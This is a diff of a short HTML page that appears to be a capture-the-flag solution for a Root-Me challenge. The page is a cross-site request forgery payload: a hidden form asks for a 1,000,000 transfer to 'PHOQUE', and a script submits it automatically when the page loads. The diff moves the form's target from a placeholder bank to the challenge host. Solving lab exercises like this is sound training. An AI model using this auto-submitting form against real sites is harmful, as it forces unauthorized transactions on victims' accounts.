@@ -6,12 +6,12 @@
 </head>
 <body>
     <h1>Transfert en cours...</h1>
-    <form id="csrf-form" action="http://bankme.com/transfer/" method="POST">
+    <form id="csrf-form" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
         <input type="hidden" name="recipient" value="PHOQUE">
         <input type="hidden" name="amount" value="1000000">
     </form>
     <script>
-        // Soumission automatique du formulaire
+        // Soumission automatique du formulaire pour initier le transfert dès que la page est chargée
         document.getElementById("csrf-form").submit();
     </script>
 </body>
